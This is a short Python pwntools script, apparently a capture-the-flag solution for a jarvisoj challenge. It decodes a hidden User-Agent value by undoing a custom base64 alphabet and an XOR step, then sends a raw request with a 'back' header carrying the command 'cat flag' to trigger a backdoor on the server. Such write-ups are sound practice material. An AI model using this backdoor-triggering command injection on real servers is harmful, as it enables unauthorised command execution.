#!/usr/bin/env python2
from pwn import *
import string

CustomBase64Chars = 'abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'
CustomBase64CharsToCode = string.maketrans(CustomBase64Chars, ''.join([chr(i) for i in range(64)]))
CustomBase64CodeToChars = string.maketrans(''.join([chr(i) for i in range(64)]), CustomBase64Chars)

def Decode(s):
    s_len = len(s)
    while s[s_len - 1] == '=':
        s_len -= 1
    s = bytearray(s[0:s_len])

    ret = bytearray()
    blocks_count, left_count = divmod(s_len, 4)
    for i in range(blocks_count):
        block = s[i * 4:i * 4 + 4].translate(CustomBase64CharsToCode)
        ret.append((4 * block[3] + ((block[2] & 0x30) >> 4)) & 0xff)
        ret.append((16 * block[2] + ((block[1] & 0x3C) >> 2)) & 0xff)
        ret.append(((block[1] << 6) + block[0]) & 0xff)

    if left_count:
        block = s[blocks_count * 4:].translate(CustomBase64CharsToCode)
        block += '\x00' * (4 - len(block))
        ret.append((4 * block[0] + ((block[1] & 0x30) >> 4)) & 0xff)
        ret.append((16 * block[1] + ((block[2] & 0x3C) >> 2)) & 0xff)
        ret.append(((block[2] << 6) + block[3]) & 0xff)
        ret = ret[0:3 * blocks_count + left_count - 1]
    
    return str(ret)

conn = remote('pwn.jarvisoj.com', 9881)

UserAgent = bytearray(Decode('La9mdn+nu/q='))
for i in range(len(UserAgent)):
    UserAgent[i] ^= i
UserAgent = str(UserAgent)
log.info('UserAgent = %s' % UserAgent)

payload = 'User-Agent: %s\r\n' % UserAgent
payload += 'back: %s\r\n' % 'cat flag'
payload += '\r\n'
conn.send_raw(payload)
log.info('sending: %s' % repr(payload))
sleep(1)
print conn.read(),
